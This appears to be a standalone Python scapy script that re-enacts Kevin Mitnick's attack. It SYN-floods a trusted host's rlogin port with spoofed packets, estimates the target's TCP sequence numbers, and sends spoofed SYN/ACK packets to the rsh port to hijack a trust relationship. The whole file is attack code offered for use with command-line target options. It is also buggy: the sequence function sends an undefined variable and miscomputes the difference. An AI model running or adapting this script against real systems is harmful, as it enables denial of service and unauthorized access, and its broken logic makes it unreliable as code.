import argparse
from scapy.all import *


def synflood(src, target):

    for sport in range(1024, 65535):
        ip_layer = IP(src=src, dst=target)
        tcp_layer = TCP(sport=sport, dport=513)
        packet = ip_layer / tcp_layer
        send(packet)

def calculate_tsn(target):
    seqnum = 0
    prenum = 0
    diffseq = 0

    for x in range(1, 5):
        if prenum != 0:
            prenum = seqnum

        pkt = IP(dst=target) / TCP()
        ans = sr1(packet, verbose=0)
        seqnum = ans.getlayer(TCP).seq
        diffseq = seqnum - prenum

        print('[+] TCP Seq Difference: ' + str(diffseq))

    return seqnum + diffseq

def spoof_connection(src, target, ack):
    ip_layer  = IP(src=src, dst=target)
    tcp_layer = TCP(sport=513, dport=514)
    syn_packet = ip_layer / tcp_layer
    send(syn_packet)
    ip_layer  = IP(src=src, dst=target)
    tcp_layer = TCP(sport=513, dport=514, ack=ack)
    ack_packet = ip_layer / tcp_layer
    send(ack_packet)

def main():
    parser = argparse.ArgumentParser(
        u'A program to mimic the functionality of '
        u"Kevin Mitnick's synack flood."
    )

    parser.add_argument(
        u'-s',
        help=u'The source for SYN flood',
        dest='src',
        default='8.8.8.8'
    )

    parser.add_argument(
        u'-S',
        dest=u'spoof_src',
        help=u'The destination of spoofed addresses',
        default='192.168.0.1'
    )

    parser.add_argument(
        u'-t',
        dest=u'target',
        help=u'The target of the SYN flood.',
        required=True
    )
    args = parser.parse_args()

    print('[+] Starting SYN Flood to suppress remote server')
    synflood(args.src, args.spoof_src)
    print('[+] Calculating correct TCP Sequence Number...')
    sequence_number = calculate_tsn(args.target) + 1
    print('[+] Attempting to spoof connection')
    spoof_connection(args.spoof_src, args.target, sequence_number)
    print('[+] Done')

if __name__ == '__main__':
    main()
